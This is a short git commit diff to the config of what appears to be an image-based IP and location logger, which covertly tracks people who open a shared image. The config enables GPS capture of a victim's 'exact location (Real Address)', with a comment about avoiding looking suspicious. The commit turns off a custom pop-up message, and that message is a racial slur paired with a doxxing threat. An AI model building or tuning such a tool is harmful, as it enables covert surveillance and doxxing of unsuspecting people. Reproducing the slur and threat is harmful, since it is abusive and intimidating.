e2c924e39206c2117d8dc74af9e3efa68f12b9b4
moooofin <98341483+mooofin@users.noreply.github.com>
2025-02-04 12:27:19 +0530

    Update main.py

--- api/main.py
+++ api/main.py
@@ -27,7 +27,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False
+        , # Enable the custom message?
         "message": "get doxxed nigger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
